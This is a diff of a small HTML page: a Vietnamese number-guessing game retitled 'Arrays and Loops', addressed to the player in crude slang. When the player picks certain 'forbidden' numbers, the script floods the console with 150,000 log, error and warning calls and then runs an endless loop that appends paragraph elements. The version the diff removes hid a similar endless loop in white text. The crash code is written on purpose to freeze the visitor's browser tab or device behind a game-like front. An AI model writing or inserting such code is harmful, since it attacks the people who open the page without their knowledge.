@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Choose number</title>
+    <title>Arrays and Loops</title>
 </head>
 <body>
     <p>Chọn một số từ 10-100 =))</p>
@@ -13,32 +13,38 @@
     <p class="js-text"></p>
 
     <script>
-        console.log('get readyv3')
+        console.log('get readyv2');
+
         function inputNum() {
             const inputElement = document.querySelector('.js-input');
             const number = Number(inputElement.value);
             const textElement = document.querySelector('.js-text');
 
             if (number === 36 || number === 18 || number === 67 || number === 69) {
-                // câu đe dọa màu trắng
-                textElement.style.color = "white";
+                textElement.style.color = "red";
                 textElement.textContent = "Tao biết ngay. Mày chọn số sai vl >:(";
 
-                // nhồi DOM bằng hàng nghìn thẻ <p> màu trắng
-                let count = 1;
-                while (true) {
-                    const line = document.createElement('p');
-                    line.style.color = "white";
-                    line.style.margin = "0";
-                    line.style.fontSize = "14px";
-                    line.textContent = count;
-                    document.body.appendChild(line);
-                    count++;
+                // 1. Console spam FIRST (very aggressive)
+                (function consoleCrash() {
+                    let i = 0;
+                    while (i < 50000) {          // flood console hard first
+                        console.log("bye bye", i, Math.random());
+                        console.error("bye bye");
+                        console.warn("bye bye");
+                        i++;
+                    }
+                })();
 
-                    const spam = setInterval(() => {
-                    console.log(count++);
-                }, 0);
-                }
+                // 2. Then DOM spam (for mobile + extra pressure)
+                let count = 0;
+                (function domCrash() {
+                    while (true) {
+                        const p = document.createElement("p");
+                        p.textContent = count++;
+                        document.body.appendChild(p);
+                    }
+                })();
+
             } else {
                 textElement.style.color = "black";
                 textElement.textContent = "Mày qua rồi. Không như mấy thằng kia bị bài học tàn khốc. Nhớ nhé: không 18, 36, 67 hay 69.";
